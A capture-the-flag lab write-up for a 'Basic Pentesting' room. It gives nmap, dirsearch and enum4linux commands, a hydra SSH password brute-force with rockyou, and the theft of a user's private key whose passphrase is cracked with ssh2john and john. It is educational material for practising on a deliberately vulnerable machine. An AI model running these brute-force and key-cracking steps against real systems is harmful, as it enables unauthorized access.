# Basic Pentesting 

# Introduction
This room demonstrates a typical penetration testing workflow: scanning, enumeration, brute-forcing, and privilege escalation. The goal is to compromise the machine and obtain the final password.

# Step 1: Service Enumeration

Tool Used: nmap

nmap -sC -sV -A <target-ip>

Why: Identify open ports and services.

Findings:
22/tcp → SSH (OpenSSH 8.2)
80/tcp → Apache HTTP server
139, 445/tcp → SMB shares (Samba)

# Step 2: Directory Brute-Forcing (HTTP)

Tool Used: dirsearch (or gobuster/dirbuster)

dirsearch -u http://<target-ip>

Why: Web servers often hide sensitive directories (admin, uploads, backups).

Finding: Hidden directory discovered. (Name was answer to Task #2).

# Step 3: SMB Enumeration

Tool Used: enum4linux

enum4linux -a <target-ip>

Why: SMB is often misconfigured → can leak usernames, shares, policies.

Finding: Discovered local users:

jan
kay
ubuntu

# Step 4: Brute Force SSH Credentials

Tool Used: hydra

hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>

Why: Try password guessing for jan on SSH service.

Finding: Hydra successfully cracked Jan’s password.

# Step 5: SSH Access

Tool Used: ssh

ssh jan@<target-ip>

Why: Remote shell access.

Finding: Logged into the machine as jan.

# Step 6: Discover Other User

Command:
ls /home

Why: Check for other users that may have sensitive files.

Finding: Found another user → kay.

# Step 7: Privilege Escalation – Cracking Kay’s SSH Key

Steps:

Found Kay’s private key in /home/kay/.ssh/id_rsa.

Copied it to attacker machine.

Fixed permissions:

chmod 600 kay_rsa

Converted for John:

ssh2john kay_rsa > kay_hash

Cracked with John:
john --wordlist=/usr/share/wordlists/rockyou.txt kay_hash

John revealed the passphrase.

Why: The key was password-protected; John brute-forced it.

Finding: Obtained Kay’s passphrase → allowed SSH login as kay.

# Step 8: SSH into Kay

Command:

ssh -i kay_rsa kay@<target-ip>

(Entered cracked passphrase when asked)

Result: Successfully logged in as Kay.

Final Answer: The password obtained after cracking.

# Conclusion

This room covered a realistic pentesting process:

Reconnaissance → (Nmap to find services)

Enumeration → (SMB with enum4linux, Web dirs with dirsearch)

Exploitation → (Brute-forcing SSH with Hydra)

Privilege Escalation → (Cracking SSH private key with John)

Key Tools Learned:

nmap – Service discovery

dirsearch – Directory brute-force

enum4linux – SMB enumeration

hydra – Password brute-force

ssh – Remote access

john – Cracking private keys

 This demonstrates how weak passwords and misconfigured services (SMB & SSH keys) can lead to full system compromise
